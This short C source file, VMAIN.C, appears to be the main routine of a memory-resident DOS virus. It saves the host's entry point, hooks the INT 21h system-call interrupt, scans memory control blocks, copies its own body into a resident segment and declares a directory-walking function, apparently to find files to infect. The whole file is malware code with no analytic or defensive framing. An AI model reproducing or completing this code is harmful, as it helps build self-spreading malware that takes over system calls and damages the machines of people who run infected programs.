
		/*	VMAIN.C  file	*/
#include"v.h"
 extern void far * OldEntryPoint;
 extern unsigned int NewReloCS;
 void scantree(void);
 typedef void interrupt (*Iptr)();

 void vmain(void)
 { int resident;      /*  segment     */
  NewReloCS = NRCS;  		/*  IMPORTANT !!!  */
  OldEntryPoint = OEP;		/*   IMPORTANT !!! */
  counter++;
  Old21Handler = getvect(0x21);

   resident = scan_mcb(psp - 1);
   if(resident) 
 { copy_body(resident);
 setvect(0x21,(Iptr) MK_FP(resident,(unsigned)&Int21handler) ); 
 }

}


